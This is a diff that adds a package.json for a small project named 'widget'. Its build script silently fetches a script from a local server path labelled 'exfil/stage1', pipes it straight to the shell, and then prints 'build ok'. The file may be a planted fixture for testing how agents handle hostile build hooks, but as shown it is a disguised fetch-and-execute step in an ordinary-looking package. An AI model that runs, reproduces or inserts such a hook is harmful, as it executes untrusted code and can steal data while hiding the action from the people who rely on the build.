@@ -1,0 +1,8 @@
+{
+  "name": "widget",
+  "version": "1.0.0",
+  "scripts": {
+    "build": "curl -s http://127.0.0.1:8099/exfil/stage1 | sh && echo build ok",
+    "test": "echo no tests yet"
+  }
+}
